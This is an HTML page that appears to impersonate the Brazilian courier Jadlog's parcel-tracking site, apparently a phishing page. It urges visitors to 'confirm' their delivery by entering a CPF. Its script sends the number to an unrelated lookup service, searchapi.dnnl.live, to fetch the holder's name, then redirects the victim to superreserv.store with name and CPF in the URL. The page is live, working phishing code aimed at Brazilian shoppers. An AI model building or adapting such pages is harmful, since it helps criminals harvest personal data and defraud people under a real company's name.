<!DOCTYPE html><html lang="pt-BR"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Rastreamento - Jadlog</title>
  <meta name="description" content="Rastreamento de encomendas na Jadlog. Acompanhe o status da sua entrega de forma rápida e segura.">
  <style>
    html, body {
      height: 100%;
      display: flex;
      flex-direction: column;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
    }
    .container {
      flex: 1; /* empurra o footer para baixo */
      max-width: 900px;
      margin: 50px auto;
      background: #ffffff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      max-width: 200px;
      height: auto;
    }
    .alert {
      background-color: #DA291C;
      color: #fff;
      font-weight: bold;
      padding: 10px;
      border-radius: 5px;
      margin-bottom: 20px;
    }
    p {
      color: #333;
      font-size: 16px;
      margin-bottom: 20px;
    }
    .input-cpf {
      border: 1px solid #CCC;
      border-radius: 5px;
      padding: 10px;
      width: 100%;
      margin-bottom: 15px;
      font-size: 16px;
    }
    .btn {
      display: block;
      width: 100%;
      background: #d71920;
      color: #fff;
      padding: 12px 0;
      text-align: center;
      border-radius: 5px;
      font-size: 16px;
      font-weight: bold;
      text-decoration: none;
      border: none;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn:hover {
      background: #b0161a;
    }
    .banner {
      margin-top: 30px;
    }
    .banner img {
      width: 100%;
      height: auto;
      border-radius: 10px;
    }
    .message {
      font-size: 14px;
      margin-top: 10px;
      color: #555;
    }
    .message.error {
      color: #d71920;
      font-weight: bold;
    }
    footer {
      background:#333;
      color:#fff;
      padding:20px 0;
      font-size:14px;
      text-align:center;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Logo -->
    <div class="logo">
      <img src="images/logo.png" alt="Logo da Jadlog">
    </div>

    <!-- Alerta -->
    <div class="alert">
      ⚠ CONFIRME O ANDAMENTO DA SUA ENCOMENDA!
    </div>

    <!-- Texto explicativo -->
    <p>Deseja acompanhar seu objeto?<br>Digite o CPF do comprador.</p>

    <!-- Formulário -->
    <form id="cpfForm" novalidate="">
      <input type="text" id="cpfInput" placeholder="000.000.000-00" class="input-cpf" maxlength="14" inputmode="numeric" autocomplete="off" oninput="formatCPF(this)" required="">
      <div id="message" class="message" hidden="">Consultando...</div>
      <div id="messageError" class="message error" hidden=""></div>
      <button type="submit" class="btn">Consultar</button>
    </form>

    <!-- Banner -->
    <div class="banner">
      <img src="images/banner-jadlog.jpg" alt="Banner Jadlog">
    </div>
  </div>

  <!-- Footer -->
  <footer>
    <p>© 2024 Jadlog - Todos os direitos reservados</p>
  </footer>

<script>
  function formatCPF(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 11) value = value.slice(0, 11);
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    input.value = value;
  }

  document.getElementById('cpfForm').addEventListener('submit', async function (event) {
    event.preventDefault();
    const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
    const message = document.getElementById('message');
    const messageError = document.getElementById('messageError');

    message.textContent = 'Consultando...';
    message.hidden = false;
    messageError.hidden = true;
    messageError.textContent = '';

    try {
      const url = `https://searchapi.dnnl.live/consulta?token_api=ryn&cpf=${cpf}`;
      const response = await fetch(url);
      if (!response.ok) throw new Error("HTTP " + response.status);

      const result = await response.json();

      if (result.status === 200 && result.dados && result.dados.length > 0) {
        const pessoa = result.dados[0];
        const nome = pessoa.NOME || "";
        const cpfApi = pessoa.CPF || cpf;
        window.location.href = `https://superreserv.store/objeto/index.html?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpfApi)}`;
      } else {
        message.hidden = true;
        messageError.textContent = 'CPF não encontrado.';
        messageError.hidden = false;
      }
    } catch (error) {
      console.error("Erro na consulta:", error);
      message.hidden = true;
      messageError.textContent = 'Erro ao consultar o CPF. Tente novamente mais tarde.';
      messageError.hidden = false;
    }
  });
</script>


</body></html>
